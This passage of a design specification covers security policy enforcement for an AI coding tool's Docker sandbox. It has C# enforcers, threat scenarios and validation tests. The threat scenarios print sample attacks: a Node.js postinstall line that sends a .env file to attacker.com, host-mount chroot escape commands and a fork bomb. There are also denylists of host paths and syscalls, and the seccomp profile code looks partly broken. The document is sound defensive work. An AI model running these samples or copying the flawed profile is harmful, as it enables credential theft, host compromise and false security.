# TIMESTAMP            TASK    EVENT                DETAILS
# 2024-01-20 10:15:32  task-1  policy-applied       network=none, user=1000:1000
# 2024-01-20 10:16:05  task-1  network-blocked      destination=8.8.8.8:53
# 2024-01-20 10:16:10  task-1  oom-killed           process=node, memory=2.1GB

# Filter by task
acode policy audit --task task-1

# JSON output
acode policy audit --json
```

### What Is Blocked

The following actions are blocked inside containers:

| Action | Blocked By | Error You'll See |
|--------|------------|------------------|
| Running as root | User policy | Permission denied |
| Network access (air-gapped) | Network policy | Network unreachable |
| Mounting filesystems | Seccomp + capabilities | Operation not permitted |
| Loading kernel modules | Seccomp + capabilities | Operation not permitted |
| Accessing Docker socket | Filesystem policy | No such file |
| Reading /etc/shadow | Filesystem policy | Permission denied |
| Forking > 512 processes | PIDs limit | Resource limit exceeded |
| Using > 2GB memory | Memory limit | Container killed (OOM) |

### Troubleshooting

#### "Operation not permitted" Errors

This usually means you're trying to do something that requires root or elevated capabilities. In the sandbox, this is intentional. If you need this operation:

1. Check if there's a non-privileged alternative
2. Consider running outside the sandbox (not recommended)
3. File a feature request if this is a common need

#### Container Killed (OOM)

Your process exceeded the memory limit. Solutions:

```yaml
# Increase memory limit in config
sandbox:
  security:
    resources:
      memory: "4g"  # Increase from 2g
```

#### Network Connection Failed

In local-only or air-gapped mode, network is intentionally blocked.

```bash
# Check your operating mode
acode config show

# If you need network access, use burst mode (if allowed)
# or switch to docker mode with network enabled
```

### Security Best Practices

1. **Don't disable security features** - They protect your host system
2. **Use the least permissive mode** - Air-gapped > Local-only > Docker > Burst
3. **Review audit logs** - Check for unexpected security events
4. **Keep memory limits reasonable** - Prevents runaway processes
5. **Don't run untrusted code outside sandbox** - Always use the sandbox

---

## Assumptions

### Technical Assumptions

1. **Docker Engine 20.10+** - Host system runs Docker Engine 20.10 or newer with cgroups v2 support
2. **Linux Kernel 5.x+** - Host kernel supports namespaces, seccomp, cgroups, and capabilities
3. **x86_64 Architecture** - Containers run on x86_64/amd64 architecture (ARM64 may work but not tested)
4. **No Nested Virtualization** - Acode runs on bare metal or VM, not inside another container
5. **Docker API v1.41+** - Docker.DotNet client compatible with Docker API version 1.41 or newer
6. **Seccomp Available** - Kernel compiled with CONFIG_SECCOMP=y and CONFIG_SECCOMP_FILTER=y
7. **AppArmor Available (Optional)** - If present, AppArmor LSM module loaded (not required but recommended)
8. **No Custom LSM** - System not using incompatible Linux Security Modules (SELinux support out of scope)
9. **Standard Syscalls** - Container images don't require exotic syscalls blocked by default seccomp profile

### Operational Assumptions

10. **Docker Daemon Running** - Docker daemon is running and accessible via socket at /var/run/docker.sock
11. **Sufficient Resources** - Host has adequate CPU/memory/disk for resource limits (4GB+ RAM, 2+ cores recommended)
12. **Non-Root Docker Socket** - Current user has permissions to access Docker socket (in `docker` group)
13. **No Conflicting Policies** - No other policy enforcement tools (e.g., Kubernetes PodSecurityPolicy) interfering
14. **Stable Network Configuration** - Host network configuration doesn't change during container lifetime
15. **Audit Storage Available** - Disk space available for audit logs (~100MB/month estimated)
16. **Time Synchronization** - Host system time synchronized (for accurate audit timestamps)
17. **Single Operating Mode** - Container operates under one operating mode for its entire lifetime (no mid-flight mode changes)

### Integration Assumptions

18. **OperatingModeService Available** - Task 001's OperatingModeService provides current mode before container creation
19. **AuditLogger Available** - Audit logging infrastructure from Task 009 is operational
20. **ContainerLifecycleManager Integration** - Task 020's ContainerLifecycleManager invokes PolicyEnforcer before Docker container creation
21. **AgentConfig Schema** - Configuration schema supports `sandbox.security_policy` section per Task 002
22. **Error Code Registry** - Error codes ACODE-POL-XXX reserved for policy enforcement failures

---

## Security Considerations

This section documents 5 major security threats and their mitigation implementations.

### Threat 1: Privilege Escalation via UID 0 (Root)

**Risk Description:** If containers run as UID 0 (root), exploits can leverage root privileges to escape the container via kernel vulnerabilities, Docker socket access, or capability abuse. Running as root violates the principle of least privilege.

**Attack Scenario:**
1. Container runs as UID 0 (root) with default capabilities
2. Attacker exploits application vulnerability to gain code execution
3. As root, attacker uses CAP_SYS_ADMIN to mount host filesystem:
   ```bash
   mkdir /mnt/host
   mount /dev/sda1 /mnt/host
   chroot /mnt/host /bin/bash
   # Now on host system as root
   ```
4. Attacker installs backdoor, exfiltrates data, pivots to other systems

**Mitigation (C# Implementation):**

```csharp
// PolicyEnforcementService.cs
namespace Acode.Infrastructure.Sandbox.Security;

public sealed class PolicyEnforcementService
{
    private readonly IOperatingModeService _modeService;
    private readonly IAuditLogger _auditLogger;
    private readonly ILogger<PolicyEnforcementService> _logger;

    public PolicyEnforcementService(
        IOperatingModeService modeService,
        IAuditLogger auditLogger,
        ILogger<PolicyEnforcementService> logger)
    {
        _modeService = modeService;
        _auditLogger = auditLogger;
        _logger = logger;
    }

    public async Task<CreateContainerParameters> ApplySecurityPolicyAsync(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig,
        CancellationToken cancellationToken = default)
    {
        // Apply non-root user enforcement
        ApplyNonRootUserPolicy(containerParams, policyConfig);

        // Apply capability dropping
        ApplyCapabilityPolicy(containerParams, policyConfig);

        // Apply network policy
        await ApplyNetworkPolicyAsync(containerParams, policyConfig, cancellationToken);

        // Apply filesystem policy
        ApplyFilesystemPolicy(containerParams, policyConfig);

        // Apply resource limits
        ApplyResourceLimitsPolicy(containerParams, policyConfig);

        // Apply seccomp/apparmor
        ApplyRuntimeSecurityPolicy(containerParams, policyConfig);

        // Audit log applied policies
        await LogAppliedPoliciesAsync(containerParams, policyConfig, cancellationToken);

        return containerParams;
    }

    private void ApplyNonRootUserPolicy(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig)
    {
        var userId = policyConfig.NonRootUser?.UserId ?? 1000;
        var groupId = policyConfig.NonRootUser?.GroupId ?? 1000;

        containerParams.User = $"{userId}:{groupId}";

        _logger.LogInformation(
            "Enforced non-root user policy: UID={UserId}, GID={GroupId}",
            userId, groupId);
    }

    private void ApplyCapabilityPolicy(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig)
    {
        if (containerParams.HostConfig == null)
        {
            containerParams.HostConfig = new HostConfig();
        }

        // Drop ALL capabilities by default
        containerParams.HostConfig.CapDrop = new List<string> { "ALL" };

        // Explicitly add only required capabilities (if any)
        var allowedCapabilities = policyConfig.AllowedCapabilities ?? new List<string>();
        if (allowedCapabilities.Any())
        {
            containerParams.HostConfig.CapAdd = new List<string>(allowedCapabilities);

            _logger.LogWarning(
                "Allowing capabilities: {Capabilities}. Ensure this is justified.",
                string.Join(", ", allowedCapabilities));
        }

        // Enforce no-new-privileges
        if (containerParams.HostConfig.SecurityOpt == null)
        {
            containerParams.HostConfig.SecurityOpt = new List<string>();
        }

        if (!containerParams.HostConfig.SecurityOpt.Contains("no-new-privileges:true"))
        {
            containerParams.HostConfig.SecurityOpt.Add("no-new-privileges:true");
        }

        _logger.LogInformation("Dropped all capabilities and enabled no-new-privileges");
    }

    private async Task LogAppliedPoliciesAsync(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig,
        CancellationToken cancellationToken)
    {
        var auditEvent = new AuditEvent
        {
            EventType = "policy_applied",
            Timestamp = DateTimeOffset.UtcNow,
            Details = new Dictionary<string, object>
            {
                ["user"] = containerParams.User ?? "default",
                ["network_mode"] = containerParams.HostConfig?.NetworkMode ?? "default",
                ["capabilities_dropped"] = containerParams.HostConfig?.CapDrop ?? new List<string>(),
                ["capabilities_added"] = containerParams.HostConfig?.CapAdd ?? new List<string>(),
                ["memory_limit_bytes"] = containerParams.HostConfig?.Memory ?? 0,
                ["pids_limit"] = containerParams.HostConfig?.PidsLimit ?? 0,
                ["readonly_rootfs"] = containerParams.HostConfig?.ReadonlyRootfs ?? false,
                ["seccomp_profile"] = containerParams.HostConfig?.SecurityOpt?
                    .FirstOrDefault(opt => opt.StartsWith("seccomp=")) ?? "default",
                ["no_new_privileges"] = containerParams.HostConfig?.SecurityOpt?
                    .Contains("no-new-privileges:true") ?? false
            }
        };

        await _auditLogger.LogAsync(auditEvent, cancellationToken);
    }
}

// SecurityPolicyConfig.cs
public sealed record SecurityPolicyConfig
{
    public NonRootUserConfig? NonRootUser { get; init; }
    public NetworkPolicyConfig? NetworkPolicy { get; init; }
    public FilesystemPolicyConfig? FilesystemPolicy { get; init; }
    public ResourceLimitsConfig? ResourceLimits { get; init; }
    public IReadOnlyList<string>? AllowedCapabilities { get; init; }
    public SeccompProfileConfig? SeccompProfile { get; init; }
    public bool EnableAppArmor { get; init; } = true;
}

public sealed record NonRootUserConfig
{
    public int UserId { get; init; } = 1000;
    public int GroupId { get; init; } = 1000;
}
```

**Validation Test:**

```bash
# Start container with policy enforcement
acode task run test

# Attempt privilege escalation (should fail)
docker exec <container-id> su -
# Expected: su: Authentication failure

docker exec <container-id> mount /dev/sda1 /mnt
# Expected: mount: permission denied (seccomp blocks mount syscall)

# Verify non-root user
docker exec <container-id> whoami
# Expected: acode (or UID 1000)
```

---

### Threat 2: Network Exfiltration in Air-Gapped Mode

**Risk Description:** In air-gapped or local-only modes, containers MUST have zero network access. Misconfiguration allowing bridge or host network enables data exfiltration, remote command & control, and supply chain attacks.

**Attack Scenario:**
1. System configured for air-gapped mode but policy enforcement bug allows bridge network
2. Malicious package postinstall script executes:
   ```javascript
   require('https').get('https://attacker.com/steal?data=' +
     require('fs').readFileSync('.env', 'utf8'));
   ```
3. Sensitive credentials (API keys, database passwords) exfiltrated
4. Attacker gains access to production systems

**Mitigation (C# Implementation):**

```csharp
// NetworkPolicyEnforcer.cs
public sealed class NetworkPolicyEnforcer
{
    private readonly IOperatingModeService _modeService;
    private readonly ILogger<NetworkPolicyEnforcer> _logger;

    public async Task ApplyNetworkPolicyAsync(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig,
        CancellationToken cancellationToken)
    {
        var currentMode = await _modeService.GetCurrentModeAsync(cancellationToken);

        if (containerParams.HostConfig == null)
        {
            containerParams.HostConfig = new HostConfig();
        }

        switch (currentMode)
        {
            case OperatingMode.AirGapped:
                // Unconditional network=none for air-gapped
                containerParams.HostConfig.NetworkMode = "none";
                _logger.LogInformation("Air-gapped mode: Network disabled (mode=none)");
                break;

            case OperatingMode.LocalOnly:
                // Default to none, allow override only with explicit config
                if (policyConfig.NetworkPolicy?.AllowNetwork == true)
                {
                    _logger.LogWarning(
                        "LocalOnly mode with network enabled via explicit configuration. " +
                        "Ensure this is intentional and justified.");
                    containerParams.HostConfig.NetworkMode = "bridge";
                }
                else
                {
                    containerParams.HostConfig.NetworkMode = "none";
                    _logger.LogInformation("LocalOnly mode: Network disabled by default");
                }
                break;

            case OperatingMode.Docker:
            case OperatingMode.Burst:
                // May allow network for cloud API calls, but still default to none
                if (policyConfig.NetworkPolicy?.AllowNetwork == true)
                {
                    containerParams.HostConfig.NetworkMode = "bridge";
                    _logger.LogInformation("Network enabled in {Mode} mode", currentMode);
                }
                else
                {
                    containerParams.HostConfig.NetworkMode = "none";
                    _logger.LogInformation("{Mode} mode: Network disabled (not requested)", currentMode);
                }
                break;

            default:
                throw new InvalidOperationException($"Unknown operating mode: {currentMode}");
        }

        // CRITICAL: Never allow host network mode
        if (containerParams.HostConfig.NetworkMode == "host")
        {
            throw new PolicyViolationException(
                "ACODE-POL-001",
                "Host network mode is forbidden. Use 'none' or 'bridge' only.");
        }

        // Audit log network policy decision
        await _auditLogger.LogAsync(new AuditEvent
        {
            EventType = "network_policy_applied",
            Timestamp = DateTimeOffset.UtcNow,
            Details = new Dictionary<string, object>
            {
                ["operating_mode"] = currentMode.ToString(),
                ["network_mode"] = containerParams.HostConfig.NetworkMode,
                ["allowed_network"] = policyConfig.NetworkPolicy?.AllowNetwork ?? false
            }
        }, cancellationToken);
    }
}

public sealed record NetworkPolicyConfig
{
    public bool AllowNetwork { get; init; } = false;
    public IReadOnlyList<string>? AllowedDestinations { get; init; }
}

public sealed class PolicyViolationException : Exception
{
    public string ErrorCode { get; }

    public PolicyViolationException(string errorCode, string message)
        : base(message)
    {
        ErrorCode = errorCode;
    }
}
```

---

### Threat 3: Fork Bomb Resource Exhaustion

**Risk Description:** Without PIDs limit, malicious or buggy code can create unlimited processes (fork bomb), exhausting system PIDs and causing host-wide denial of service. All containers and host processes become unable to spawn new processes.

**Attack Scenario:**
1. Container has no PIDs limit configured
2. Malicious npm package postinstall script executes fork bomb:
   ```bash
   :(){ :|:& };:
   # Or in Node.js:
   const { spawn } = require('child_process');
   while(true) { spawn('node', ['-e', 'while(true){}']); }
   ```
3. Process count explodes: 1 → 2 → 4 → 8 → 16 → 32 → ... → 100,000+
4. Host PID table exhausted (typical limit: 32,768 or 4,194,304)
5. Docker daemon can't spawn new containers
6. SSH sessions can't fork shells
7. System recovery requires hard reboot

**Mitigation (C# Implementation):**

```csharp
// ResourceLimitsPolicyEnforcer.cs
namespace Acode.Infrastructure.Sandbox.Security;

public sealed class ResourceLimitsPolicyEnforcer
{
    private readonly ILogger<ResourceLimitsPolicyEnforcer> _logger;
    private readonly IAuditLogger _auditLogger;

    // Sane defaults based on typical workloads
    private const long DefaultMemoryLimitBytes = 4L * 1024 * 1024 * 1024; // 4GB
    private const long DefaultMemorySwapLimitBytes = 4L * 1024 * 1024 * 1024; // 4GB (no swap abuse)
    private const long DefaultPidsLimit = 512; // Enough for builds, low enough to prevent bombs
    private const long DefaultCpuQuota = 200000; // 200% of 1 core (2 cores)
    private const long DefaultCpuPeriod = 100000; // Standard 100ms period
    private const int DefaultUlimitNofile = 65536; // Open file descriptors
    private const int DefaultUlimitNproc = 4096; // Max processes (additional safeguard)

    public ResourceLimitsPolicyEnforcer(
        ILogger<ResourceLimitsPolicyEnforcer> logger,
        IAuditLogger auditLogger)
    {
        _logger = logger;
        _auditLogger = auditLogger;
    }

    public void ApplyResourceLimitsPolicy(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig)
    {
        if (containerParams.HostConfig == null)
        {
            containerParams.HostConfig = new HostConfig();
        }

        // Memory limits
        var memoryLimit = policyConfig.ResourceLimits?.MemoryLimitBytes ?? DefaultMemoryLimitBytes;
        containerParams.HostConfig.Memory = memoryLimit;
        containerParams.HostConfig.MemorySwap = policyConfig.ResourceLimits?.MemorySwapLimitBytes
            ?? DefaultMemorySwapLimitBytes;
        containerParams.HostConfig.OomKillDisable = false; // MUST enable OOM killer

        _logger.LogInformation(
            "Applied memory limits: Memory={Memory}MB, Swap={Swap}MB, OOM killer enabled",
            memoryLimit / (1024 * 1024),
            containerParams.HostConfig.MemorySwap / (1024 * 1024));

        // CPU limits (throttling, not hard kill)
        var cpuQuota = policyConfig.ResourceLimits?.CpuQuota ?? DefaultCpuQuota;
        containerParams.HostConfig.CpuQuota = cpuQuota;
        containerParams.HostConfig.CpuPeriod = DefaultCpuPeriod;

        var cpuCores = (double)cpuQuota / DefaultCpuPeriod;
        _logger.LogInformation(
            "Applied CPU limits: Quota={Quota}, Period={Period} ({Cores} cores)",
            cpuQuota, DefaultCpuPeriod, cpuCores);

        // PIDs limit (CRITICAL for fork bomb prevention)
        var pidsLimit = policyConfig.ResourceLimits?.PidsLimit ?? DefaultPidsLimit;
        containerParams.HostConfig.PidsLimit = pidsLimit;

        _logger.LogInformation(
            "Applied PIDs limit: {PidsLimit} (prevents fork bombs)",
            pidsLimit);

        // Ulimits (additional safeguards)
        containerParams.HostConfig.Ulimits = new List<Ulimit>
        {
            new Ulimit
            {
                Name = "nofile",
                Soft = DefaultUlimitNofile,
                Hard = DefaultUlimitNofile
            },
            new Ulimit
            {
                Name = "nproc",
                Soft = DefaultUlimitNproc,
                Hard = DefaultUlimitNproc
            }
        };

        _logger.LogInformation(
            "Applied ulimits: nofile={Nofile}, nproc={Nproc}",
            DefaultUlimitNofile, DefaultUlimitNproc);

        // Audit log resource limits
        _auditLogger.LogAsync(new AuditEvent
        {
            EventType = "resource_limits_applied",
            Timestamp = DateTimeOffset.UtcNow,
            Details = new Dictionary<string, object>
            {
                ["memory_limit_bytes"] = memoryLimit,
                ["memory_swap_limit_bytes"] = containerParams.HostConfig.MemorySwap,
                ["cpu_quota"] = cpuQuota,
                ["cpu_period"] = DefaultCpuPeriod,
                ["cpu_cores_equivalent"] = cpuCores,
                ["pids_limit"] = pidsLimit,
                ["ulimit_nofile"] = DefaultUlimitNofile,
                ["ulimit_nproc"] = DefaultUlimitNproc,
                ["oom_kill_enabled"] = !containerParams.HostConfig.OomKillDisable
            }
        }).Wait();
    }
}

public sealed record ResourceLimitsConfig
{
    public long? MemoryLimitBytes { get; init; }
    public long? MemorySwapLimitBytes { get; init; }
    public long? CpuQuota { get; init; }
    public long? PidsLimit { get; init; }
}
```

**Validation Test:**

```bash
# Test fork bomb prevention
acode task run test

# Inside container, attempt fork bomb
docker exec <container-id> bash -c ':(){ :|:& };:'

# Expected: Container hits PIDs limit at 512 processes
# Container may be killed, but host remains stable

# Verify PIDs limit applied
docker inspect <container-id> --format '{{.HostConfig.PidsLimit}}'
# Expected: 512

# Check host is still responsive
docker ps
# Expected: Command succeeds, other containers unaffected
```

---

#### Security Threat 4: Volume Mount Escape / Host Filesystem Access

**Risk:** Container mounts sensitive host paths (e.g., `/`, `/etc`, `/var/run/docker.sock`) gaining full host access.

**Attack Scenario:**
1. User (or malicious dependency) requests container with `-v /:/host` mount
2. Container gains read/write access to entire host filesystem
3. Attacker modifies `/host/etc/passwd`, `/host/root/.ssh/authorized_keys`
4. Attacker reads secrets from `/host/var/secrets`, `/host/home/*/.env`
5. Attacker mounts Docker socket (`/var/run/docker.sock`) and spawns privileged container
6. Complete host compromise achieved

**Mitigation:**

Implement a volume mount policy enforcer that validates all volume mounts against a denylist of sensitive host paths. Reject containers attempting to mount protected paths.

```csharp
// VolumeMountPolicyEnforcer.cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Docker.DotNet.Models;
using Microsoft.Extensions.Logging;

namespace Acode.Infrastructure.Sandbox.Security;

public sealed class VolumeMountPolicyEnforcer
{
    private readonly ILogger<VolumeMountPolicyEnforcer> _logger;
    private readonly IAuditLogger _auditLogger;

    // Sensitive host paths that must NEVER be mounted
    private static readonly HashSet<string> DeniedHostPaths = new(StringComparer.OrdinalIgnoreCase)
    {
        "/",                        // Root filesystem
        "/root",                    // Root home directory
        "/etc",                     // System configuration
        "/var",                     // System state
        "/boot",                    // Boot files
        "/sys",                     // Kernel interface
        "/proc",                    // Process information
        "/dev",                     // Device files
        "/run",                     // Runtime state
        "/var/run/docker.sock",     // Docker socket (critical!)
        "/usr",                     // System binaries
        "/bin",                     // Essential binaries
        "/sbin",                    // System binaries
        "/lib",                     // System libraries
        "/lib64",                   // System libraries
        "/home",                    // All user home directories
        "/opt",                     // Optional software
        "/mnt",                     // Mount points
        "/media",                   // Removable media
    };

    // Paths that are allowed to be mounted (workspace-only)
    private static readonly string[] AllowedPathPrefixes = new[]
    {
        "/tmp/acode-workspace-",    // Acode workspaces only
    };

    public VolumeMountPolicyEnforcer(
        ILogger<VolumeMountPolicyEnforcer> logger,
        IAuditLogger auditLogger)
    {
        _logger = logger;
        _auditLogger = auditLogger;
    }

    public void ValidateAndApplyVolumeMountPolicy(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig)
    {
        if (containerParams.HostConfig?.Binds == null || !containerParams.HostConfig.Binds.Any())
        {
            _logger.LogInformation("No volume mounts requested, policy check passed");
            return;
        }

        var requestedMounts = containerParams.HostConfig.Binds;
        var violations = new List<string>();

        foreach (var mount in requestedMounts)
        {
            // Parse mount string: "host-path:container-path:options"
            var parts = mount.Split(':', 3);
            if (parts.Length < 2)
            {
                violations.Add($"Invalid mount format: {mount}");
                continue;
            }

            var hostPath = Path.GetFullPath(parts[0]); // Normalize path
            var containerPath = parts[1];
            var options = parts.Length > 2 ? parts[2] : string.Empty;

            // Check if host path is in denylist
            if (IsDeniedPath(hostPath))
            {
                violations.Add($"Denied host path: {hostPath} -> {containerPath}");
                continue;
            }

            // Check if host path matches allowed prefixes
            if (!IsAllowedPath(hostPath))
            {
                violations.Add($"Host path not in allowed workspace: {hostPath}");
                continue;
            }

            // Ensure mount is read-only if it's not the primary workspace
            if (!options.Contains("ro") && !hostPath.StartsWith("/tmp/acode-workspace-"))
            {
                violations.Add($"Mount must be read-only: {hostPath}");
                continue;
            }

            _logger.LogInformation(
                "Volume mount allowed: {HostPath} -> {ContainerPath} ({Options})",
                hostPath, containerPath, options);
        }

        // If any violations, reject container creation
        if (violations.Any())
        {
            var errorMessage = $"Volume mount policy violations:\n  - {string.Join("\n  - ", violations)}";
            _logger.LogError(errorMessage);

            _auditLogger.LogAsync(new AuditEvent
            {
                EventType = "volume_mount_policy_violation",
                Timestamp = DateTimeOffset.UtcNow,
                Severity = AuditSeverity.Critical,
                Details = new Dictionary<string, object>
                {
                    ["requested_mounts"] = requestedMounts,
                    ["violations"] = violations,
                    ["action"] = "container_creation_denied"
                }
            }).Wait();

            throw new SecurityPolicyViolationException(errorMessage);
        }

        _auditLogger.LogAsync(new AuditEvent
        {
            EventType = "volume_mount_policy_passed",
            Timestamp = DateTimeOffset.UtcNow,
            Details = new Dictionary<string, object>
            {
                ["allowed_mounts"] = requestedMounts,
                ["count"] = requestedMounts.Count
            }
        }).Wait();
    }

    private static bool IsDeniedPath(string hostPath)
    {
        // Exact match
        if (DeniedHostPaths.Contains(hostPath))
        {
            return true;
        }

        // Parent path match (e.g., /etc/passwd is denied because /etc is denied)
        return DeniedHostPaths.Any(denied =>
            hostPath.StartsWith(denied + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase));
    }

    private static bool IsAllowedPath(string hostPath)
    {
        return AllowedPathPrefixes.Any(prefix =>
            hostPath.StartsWith(prefix, StringComparison.OrdinalIgnoreCase));
    }
}

public sealed class SecurityPolicyViolationException : Exception
{
    public SecurityPolicyViolationException(string message) : base(message) { }
}
```

**Validation Test:**

```bash
# Test volume mount denylist
acode task run test --debug

# Attempt to mount sensitive paths (should fail)
docker run -v /:/host alpine ls /host
# Expected: Error - "Volume mount policy violations: Denied host path: / -> /host"

docker run -v /var/run/docker.sock:/var/run/docker.sock alpine ls
# Expected: Error - "Denied host path: /var/run/docker.sock"

docker run -v /etc:/etc:ro alpine ls /etc
# Expected: Error - "Denied host path: /etc"

# Valid workspace mount (should succeed)
docker run -v /tmp/acode-workspace-abc123:/workspace:rw alpine ls /workspace
# Expected: Success - mount allowed

# Check audit logs for violations
acode audit query --event-type volume_mount_policy_violation --last 5m
# Expected: Shows all denied mount attempts with full details
```

---

#### Security Threat 5: Seccomp Profile Bypass / Dangerous Syscalls

**Risk:** Container runs without Seccomp profile, allowing dangerous syscalls (e.g., `reboot`, `mount`, `keyctl`) that can compromise host.

**Attack Scenario:**
1. Container starts with `--security-opt seccomp=unconfined` or no Seccomp profile
2. Malicious code executes dangerous syscalls:
   - `mount()` - Mount host filesystems inside container
   - `reboot()` - Reboot host system
   - `keyctl()` - Access kernel keyring, steal credentials
   - `bpf()` - Load kernel BPF programs, escalate privileges
   - `perf_event_open()` - Access kernel performance data, side-channel attacks
3. Attacker gains kernel-level capabilities
4. Container breakout achieved via kernel exploitation

**Mitigation:**

Implement a Seccomp profile enforcer that applies a restrictive default Seccomp profile blocking dangerous syscalls. Use Docker's default Seccomp profile or a custom profile.

```csharp
// SeccompPolicyEnforcer.cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using Docker.DotNet.Models;
using Microsoft.Extensions.Logging;

namespace Acode.Infrastructure.Sandbox.Security;

public sealed class SeccompPolicyEnforcer
{
    private readonly ILogger<SeccompPolicyEnforcer> _logger;
    private readonly IAuditLogger _auditLogger;
    private readonly string _seccompProfilePath;

    // Dangerous syscalls that MUST be blocked
    private static readonly string[] BlockedSyscalls = new[]
    {
        "reboot",               // Reboot host system
        "swapon", "swapoff",    // Manage swap
        "mount", "umount",      // Mount filesystems
        "pivot_root",           // Change root filesystem
        "chroot",               // Change root directory (can escape)
        "keyctl",               // Access kernel keyring
        "add_key",              // Add keys to keyring
        "request_key",          // Request keys from keyring
        "bpf",                  // Load BPF programs
        "perf_event_open",      // Performance monitoring (side channels)
        "fanotify_init",        // Filesystem monitoring
        "lookup_dcookie",       // Directory cache lookup
        "kcmp",                 // Compare kernel objects
        "finit_module",         // Load kernel modules
        "init_module",          // Load kernel modules
        "delete_module",        // Delete kernel modules
        "kexec_load",           // Load kernel for kexec
        "kexec_file_load",      // Load kernel for kexec (file-based)
    };

    public SeccompPolicyEnforcer(
        ILogger<SeccompPolicyEnforcer> logger,
        IAuditLogger auditLogger,
        string seccompProfilePath = "/etc/acode/seccomp-default.json")
    {
        _logger = logger;
        _auditLogger = auditLogger;
        _seccompProfilePath = seccompProfilePath;
    }

    public void ApplySeccompPolicy(
        CreateContainerParameters containerParams,
        SecurityPolicyConfig policyConfig)
    {
        if (containerParams.HostConfig == null)
        {
            containerParams.HostConfig = new HostConfig();
        }

        if (containerParams.HostConfig.SecurityOpt == null)
        {
            containerParams.HostConfig.SecurityOpt = new List<string>();
        }

        // Check if user tried to disable Seccomp (FORBIDDEN)
        var unconfined = containerParams.HostConfig.SecurityOpt
            .Any(opt => opt.Contains("seccomp=unconfined"));

        if (unconfined)
        {
            var errorMessage = "Seccomp cannot be disabled (seccomp=unconfined is forbidden)";
            _logger.LogError(errorMessage);

            _auditLogger.LogAsync(new AuditEvent
            {
                EventType = "seccomp_disable_attempt",
                Timestamp = DateTimeOffset.UtcNow,
                Severity = AuditSeverity.Critical,
                Details = new Dictionary<string, object>
                {
                    ["attempted_security_opt"] = containerParams.HostConfig.SecurityOpt,
                    ["action"] = "container_creation_denied"
                }
            }).Wait();

            throw new SecurityPolicyViolationException(errorMessage);
        }

        // Use custom Seccomp profile if provided, otherwise use Docker default
        string seccompProfile;
        if (policyConfig.SeccompProfilePath != null && File.Exists(policyConfig.SeccompProfilePath))
        {
            seccompProfile = $"seccomp={policyConfig.SeccompProfilePath}";
            _logger.LogInformation(
                "Applying custom Seccomp profile: {ProfilePath}",
                policyConfig.SeccompProfilePath);
        }
        else if (File.Exists(_seccompProfilePath))
        {
            seccompProfile = $"seccomp={_seccompProfilePath}";
            _logger.LogInformation(
                "Applying default Acode Seccomp profile: {ProfilePath}",
                _seccompProfilePath);
        }
        else
        {
            // Fall back to Docker's default Seccomp profile (better than nothing)
            _logger.LogWarning(
                "No custom Seccomp profile found, using Docker default. " +
                "For maximum security, provide a custom profile at {ProfilePath}",
                _seccompProfilePath);
            return; // Docker applies default Seccomp automatically
        }

        // Apply Seccomp profile
        containerParams.HostConfig.SecurityOpt.Add(seccompProfile);

        _logger.LogInformation("Seccomp policy applied: {Profile}", seccompProfile);

        _auditLogger.LogAsync(new AuditEvent
        {
            EventType = "seccomp_policy_applied",
            Timestamp = DateTimeOffset.UtcNow,
            Details = new Dictionary<string, object>
            {
                ["seccomp_profile"] = seccompProfile,
                ["blocked_syscalls_count"] = BlockedSyscalls.Length,
                ["security_opt"] = containerParams.HostConfig.SecurityOpt
            }
        }).Wait();
    }

    /// <summary>
    /// Generates a default Seccomp profile JSON that blocks dangerous syscalls.
    /// Should be called during Acode initialization to create /etc/acode/seccomp-default.json
    /// </summary>
    public static string GenerateDefaultSeccompProfile()
    {
        var profile = new
        {
            defaultAction = "SCMP_ACT_ERRNO", // Deny by default
            architectures = new[] { "SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32" },
            syscalls = new[]
            {
                new
                {
                    names = BlockedSyscalls,
                    action = "SCMP_ACT_ERRNO", // Block these syscalls
                    comment = "Dangerous syscalls that must be blocked"
                },
                new
                {
                    names = new[] { "*" }, // Allow all other syscalls
                    action = "SCMP_ACT_ALLOW"
                }
            }
        };

        return JsonSerializer.Serialize(profile, new JsonSerializerOptions
        {
            WriteIndented = true
        });
    }
}
```

**Validation Test:**

```bash
# Test Seccomp profile enforcement
acode task run test --debug

# Verify Seccomp profile is applied
docker inspect <container-id> --format '{{.HostConfig.SecurityOpt}}'
# Expected: [seccomp=/etc/acode/seccomp-default.json]

# Attempt to disable Seccomp (should fail)
acode task run test --docker-opt="--security-opt seccomp=unconfined"
# Expected: Error - "Seccomp cannot be disabled (seccomp=unconfined is forbidden)"

# Test that dangerous syscalls are blocked inside container
docker exec <container-id> bash -c 'python3 -c "import os; os.system(\"reboot\")"'
# Expected: Operation not permitted (errno)

docker exec <container-id> bash -c 'mount -t tmpfs tmpfs /mnt'
# Expected: Operation not permitted (errno)

# Verify Seccomp profile content
cat /etc/acode/seccomp-default.json
# Expected: JSON with blocked syscalls (reboot, mount, keyctl, bpf, etc.)

# Check audit logs
acode audit query --event-type seccomp_policy_applied --last 5m
# Expected: Shows Seccomp profile applied with blocked syscalls count
```

**Generate Seccomp Profile (Initialization):**

```bash
# Generate default Seccomp profile during Acode setup
acode init --generate-seccomp-profile

# This creates /etc/acode/seccomp-default.json with:
# - Block reboot, mount, keyctl, bpf, perf_event_open
# - Allow all other syscalls
# - Architecture: x86_64, x86, x32
```

---

## Best Practices

### Policy Definition

1. **Deny by default** - Explicitly allow, don't explicitly deny
2. **Least privilege** - Grant minimum permissions required
3. **Mode-based policies** - Different rules for local-only vs burst mode
4. **Document all policies** - Clear explanation of what each policy does

### Enforcement

5. **Validate at container creation** - Reject invalid configurations
6. **Runtime monitoring** - Detect policy violations during execution
7. **Fail secure** - On error, deny rather than allow
8. **Log all decisions** - Audit trail for policy enforcement

### User Experience

9. **Clear error messages** - Explain why operation was blocked
10. **Suggest remediation** - How to adjust policy if needed
11. **Preview mode** - Show what would be blocked without blocking
12. **Override with confirmation** - Allow bypass with explicit acknowledgment

---

## Troubleshooting

This section provides solutions to common issues encountered when enforcing security policies inside Docker sandbox containers.

---

